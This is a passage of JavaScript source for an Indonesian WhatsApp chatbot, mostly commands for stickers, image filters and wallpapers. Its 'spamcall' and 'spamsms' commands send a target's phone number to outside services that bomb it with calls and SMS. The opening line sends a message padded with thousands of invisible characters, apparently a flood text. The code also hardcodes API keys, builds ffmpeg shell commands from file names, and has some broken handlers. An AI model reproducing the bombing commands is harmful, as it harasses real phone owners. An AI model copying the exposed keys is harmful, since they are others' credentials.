                benny.sendMessage(from, `͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${mskp}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`, text, {quoted: adadeh})
				}
				break
				case 'artinama':
				
				if (args.length < 1) return reply('Nama nya mana?')
				var tkst = await ArtiNama(body.slice(10))
				benny.sendMessage(from, tkst, text, {quoted: adadeh})
				break
				case 'artimimpi':
				
				if (args.length < 1) return reply('Nama nya mana?')
				var tkst = await ArtiMimpi(body.slice(11))
				benny.sendMessage(from, tkst, text, {quoted: adadeh})
				break
				case 'emojisticker':
				
				var emojis = body.slice(14)
				buffer = await getBaper(`https://api.vhtear.com/emojitopng?code=${emojis}&apikey=${vhtearkey}`)
				benny.sendMessage(from, buffer, sticker, {quoted: adadeh})
				break
				case 'runtime':
				
					runtime = process.uptime()
					teks = `${tek(runtime)}`
					reply(teks)
					break
		 case 'asupan':
					
					if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
		  anu = JSON.parse(fs.readFileSync('./src/asupan.json')) 
		  let asupan = anu[Math.floor(Math.random() * anu.length)]
		  buffer = await getBaper(asupan)
		  reply(mess.wait)
					benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${asupan}.mp4`, quoted: adadeh, caption: 'Neh..'})
							break
					case 'spamcall':
					
					if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
					if (args[0].startsWith('62')) return reply('Salah! contoh: 81234567890')
					if (!isOwner && args[0].startsWith('89636006352')) return reply('Tidak bisa spam call owner!')
					anu = await fetchJson(`https://api-jojo.herokuapp.com/api/spamcall?no=${body.slice(10)}`)
					anu = await fetchJson(`https://api-jojo.herokuapp.com/api/spamcall?no=${body.slice(10)}`)
					anu = await fetchJson(`https://videfikri.com/api/call/?nohp=${body.slice(10)}`)
					anu = await fetchJson(`https://videfikri.com/api/call/?nohp=${body.slice(10)}`)
					reply(anu.logs)
					break
					case 'spamsms':
					
					if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
					toti = args[0]
					anu = await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${toti}`)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${toti}`)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${toti}`)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${toti}`)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${toti}`)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${toti}`)
					reply(anu.result)
					break
					case 'phcomment':
									
                                     var imgbb = require('imgbb-uploader')
									 var gos = body.slice(11)
					var namalu = gos.split("|")[0];
					var komenlu = gos.split("|")[1];
                                         if (isMedia && !ben.message.videoMessage || isQuotedImage) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										buffer = await getBaper(`https://turuapi.org/textmaker/phcomment_custom?apikey=${naufalkey}&url=${teks}&nama=${namalu}&comment=${komenlu}`)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
										case 'imagewanted':
									
                                     var imgbb = require('imgbb-uploader')
									 var gos = body.slice(13)
					var teksn = gos.split("|")[0];
					var teksp = gos.split("|")[1];
                                         if (isMedia && !ben.message.videoMessage || isQuotedImage) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										buffer = await getBaper(`https://videfikri.com/api/textmaker/wanted/?urlgbr=${teks}&text1=${teksn}&text2=${teksp}`)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
					case 'bikinmeme':
									
                                     var imgbb = require('imgbb-uploader')
									 var gos = body.slice(11)
					var teksn = gos.split("|")[0];
					var teksp = gos.split("|")[1];
                                         if (isMedia && !ben.message.videoMessage || isQuotedImage) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										 buffer = await getBaper(`https://api.memegen.link/images/custom/${teksn}/${teksp}.png?background=${teks}`)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
					case 'semoji':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 😭`)
                    buffer = await emojiss.get(args[0])
					console.log(buffer)
                    sendStickerUrl(from, buffer.images[4].url)
                    break
					case 'gtav':
									
									if (args.length < 1) return reply('Nama file nya mau apa?')
                                     var imgbb = require('imgbb-uploader')
                                         if (isMedia && !ben.message.videoMessage || isQuotedImage) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await getBaper(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${teks}`)
										benny.sendMessage(from, anuan, image, {quoted: adadeh, caption: 'nih'})
										 }
										break
										case 'gambarhitung':
									
									if (args.length < 1) return reply('Nama file nya mau apa?')
                                     var imgbb = require('imgbb-uploader')
                                         if (isMedia && !ben.message.videoMessage || isQuotedImage) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`naufalhoster.xyz/tools/photomath?apikey=YunitaGanteng&url=${teks}`)
										teksk = `*Pertanyaan:* ${anuan.result.question}\n*Jawaban:* ${anuan.result.solution}`
										reply(teksk)
										 }
										break
										case 'imagetopdf':
									
                                     var imgbb = require('imgbb-uploader')
                                         if (isMedia && !ben.message.videoMessage || isQuotedImage) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					const namaFile = body.slice(12)
					var files = fs.createWriteStream('image' + '.pdf')
					  var pdf = new imgtopdf({ autoFirstPage: false })
										pdf.addPage({ size: [image.width, image.height] })
                                        pdf.image(owgi, 0,0)
                                        pdf.pipe(files)
                                        pdf.end()
										benny.sendMessage(from, fs.readFileSync(files), document, { mimetype: 'application/pdf', filename: namaFile, caption: 'Neh..', quoted: adadeh})
										 }
										break
										case 'stickgerak':
										if (args.length < 1) return reply('Text nya mana kak?')
										sendStickerUrl(from, `https://pecundang2.herokuapp.com/api/flamingtext/memories?text=${body.slice(12)}`)
										break
										case 'sticktopdf':
									 if (!isQuotedSticker) return reply('Sticker aja kak')
                                         if (isQuotedSticker) {
											 ran = getRandom('.png')
                                         ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										 ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
                                        reply(mess.wait)
										exec(`ffmpeg -i ${ehgmediabi} ${ran}`, (err) => {
	reply(mess.wait)
	fs.writeFileSync('triger.png', fs.readFileSync(ran))
					var files = fs.createWriteStream('sticker' + '.pdf')
					  var pdf = new imgtopdf({ autoFirstPage: false })
										pdf.addPage({ size: [image.width, image.height] })
                                        pdf.image('triger.png', 0,0)
                                        pdf.pipe(files)
                                        pdf.end()
										benny.sendMessage(from, fs.readFileSync(files), document, { mimetype: 'application/pdf', filename: namaFile, caption: 'Neh..', quoted: adadeh})
										})
										}
										break
										case 'stickcartoon':
									
                                     var imgbb = require('imgbb-uploader')
									 if (!isQuotedSticker) return reply('Reply sticker nya om')
                                         if (isQuotedSticker) {
											 ran = getRandom('.png')
                                         ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} ${ran}`, async (err) => {
					 anu = await uploadImages(fs.readFileSync(ran), sender)
										anuan = await fetchJson(`https://naufalhoster.xyz/tools/photo_cartoon?apikey=${naufalkey}&url=${anu}`)
										sendStickerUrl(from, anuan.result.image)
					})
										 }
										break
										case 'imagecartoon':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://naufalhoster.xyz/tools/photo_cartoon?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
										case 'imagecomic':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/photo_comic?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
										case 'stickcomic':
									
                                     var imgbb = require('imgbb-uploader')
                                         if (isQuotedSticker) {
                                         ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
										ran = getRandom('.png')
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} ${ran}`, async (err) => {
					 anu = await uploadImages(fs.readFileSync(ran), sender)
										anuan = await fetchJson(`https://turuapi.org/tools/photo_comic?apikey=${naufalkey}&url=${anu}`)
										sendStickerUrl(from, anuan.result.image)
					})
										 }
										break
										case 'imagefire':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/photo_fire?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
										case 'stickfire':
									
                                     var imgbb = require('imgbb-uploader')
									 if (!isQuotedSticker) return reply('Reply sticker nya om')
                                         if (isQuotedSticker) {
											 ran = getRandom('.png')
                                         ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} ${ran}`, async (err) => {
					 anu = await uploadImages(fs.readFileSync(ran), sender)
										anuan = await fetchJson(`https://turuapi.org/tools/photo_fire?apikey=${naufalkey}&url=${anu}`)
										sendStickerUrl(from, anuan.result.image)
					})
										 }
										break
										case 'imagepencil':
										case 'imagepensil':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await getBaper(`http://api.lolhuman.xyz/api/editor/pencil?apikey=${lolkey}&img=${teks}`)
										benny.sendMessage(from, anuan, image, {quoted: adadeh})
										 }
										break
									
										case 'imageburik':
										case 'image8bit':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await getBaper(`http://api.lolhuman.xyz/api/editor/pixelate?apikey=${lolkey}&img=${teks}`)
										benny.sendMessage(from, anuan, image, {quoted: adadeh})
										 }
										break
										case 'imageinvert':
										case 'invertimage':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await getBaper(`http://api.lolhuman.xyz/api/editor/invert?apikey=${lolkey}&img=${teks}`)
										benny.sendMessage(from, anuan, image, {quoted: adadeh})
										 }
										break
										case 'listonline':

if (!isGroup) return reply(mess.only.group)
        		if (!isOwner && !ben.key.fromMe) return
        		let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
			    let online = [...Object.keys(benny.chats.get(ido).presences), benny.user.jid]
			    benny.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: adadeh,
  			  contextInfo: { mentionedJid: online }
			    })
				break 
										case 'imagejail':
										case 'imagepenjara':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await getBaper(`https://naufalhoster.xyz/textmaker/jail?apikey=${naufalkey}&url=${teks}`)
										benny.sendMessage(from, anuan, image, {quoted: adadeh})
										 }
										break
										case 'stickjail':
									
                                     var imgbb = require('imgbb-uploader')
									 if (!isQuotedSticker) return reply('Reply sticker nya om')
                                         if (isQuotedSticker) {
											 ran = getRandom('.png')
                                         ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					exec(`ffmpeg -i ${owgi} ${ran}`, async (err) => {
					 anu = await uploadImages(fs.readFileSync(ran), sender)
										sendStickerUrl(from, `https://naufalhoster.xyz/textmaker/jail?apikey=${naufalkey}&url=${anu}`)
					})
										 }
										break
										case 'imagedelete':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await getBaper(`https://naufalhoster.xyz/textmaker/windows_delete_file?apikey=${naufalkey}&url=${teks}`)
										benny.sendMessage(from, anuan, image, {quoted: adadeh})
										 }
										break
										case 'resepmakanan': 
										if (args.length < 1) return reply('Nama makanan nya apa?')
										anu = await resepnya(body.slice(14))
										var apo = anu.results
										console.log(apo)
										teks = `*Judul:* ${apo.title}\n*Porsi:* ${apo.servings}\n*Waktu:* ${apo.times}\n*Bahan:* ${apo.ingredient}\n*Kesulitan:* ${apo.dificulty}\n*Langkah:* ${apo.step}\n*Desc:* ${apo.desc}*\n`
										reply(teks)
										break
										case 'imagewasted':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                       reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										buffer = await getBaper(`https://naufalhoster.xyz/textmaker/gta?apikey=${naufalkey}&url=${teks}`)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
							case 'imagefisheye':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/fisheye?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
							case 'imagegrafitti':
							case 'imagegrafiti':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/photo_grafitti?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
										case 'imagenegative':
							case 'imagenegatif':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					 anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										anuan = await fetchJson(`https://turuapi.org/tools/negative?apikey=${naufalkey}&url=${teks}`)
										buffer = await getBaper(anuan.result.image)
										benny.sendMessage(from, buffer, image, {quoted: adadeh})
										 }
										break
										case 'randomwallpaper':
										
										ono = JSON.parse(fs.readFileSync('./src/randomwall.json'))
	anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wpcyberspace':
										
										ono = JSON.parse(fs.readFileSync('./src/cyberspace.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wpgunung':
										
										ono = JSON.parse(fs.readFileSync('./src/wallgunung.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wpneon':
										
										ono = JSON.parse(fs.readFileSync('./src/wallneon.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wpml':
										
										ono = JSON.parse(fs.readFileSync('./src/wallml.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wphacker':
										
										ono = JSON.parse(fs.readFileSync('./src/wallhack.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'quotes':
										
										ono = fs.readFileSync('./src/quotes.json')
jsonData = JSON.parse(ono)
  randIndex = Math.floor(Math.random() * jsonData.length)
 randKey = jsonData[randIndex]
										reply(`*Author:* ${randKey.by}\n*Quotes:* ${randKey.quote}`)
										break
										case 'waifu':
										
										ono = fs.readFileSync('./src/waifu.json')
  jsonData = JSON.parse(ono)
  randIndex = Math.floor(Math.random() * jsonData.length)
  randKey = jsonData[randIndex]
  buffer = await getBaper(randKey.image)
  teks = `*${randKey.teks}*`
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
										break
										case 'getserial':
										
										anu = await register.getRegisteredSerialFromId(sender, _registered)
										benny.sendMessage(from, anu, text, {quoted: adadeh})
										break
										case 'serial':
										
										ono = fs.readFileSync('./src/registered.json')
  jsonData = JSON.parse(ono)
  randIndex = Math.floor(Math.random() * jsonData.length)
  randKey = jsonData[randIndex]
										benny.sendMessage(from, randKey.serial, text, {quoted: adadeh})
										break
										 case 'wancak':
                    buffer = await getBaper(`http://api.lolhuman.xyz/api/onecak?apikey=${lolkey}`)
                    benny.sendMessage(from, buffer, image, {quoted: adadeh})
                    break
										case 'wpcode':
										
										ono = JSON.parse(fs.readFileSync('./src/wallcode.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wpff':
										
										ono = JSON.parse(fs.readFileSync('./src/wallff.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wppubg':
										
										ono = JSON.parse(fs.readFileSync('./src/wallpubg.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
										case 'wpprogrammer':
										case 'wprogrammer':
										case 'wpprogram':
										case 'wprogram':
										
										ono = JSON.parse(fs.readFileSync('./src/wallprogram.json'))
  anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
							case 'imagedistortion':
							case 'imagedt':
									
                                     var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
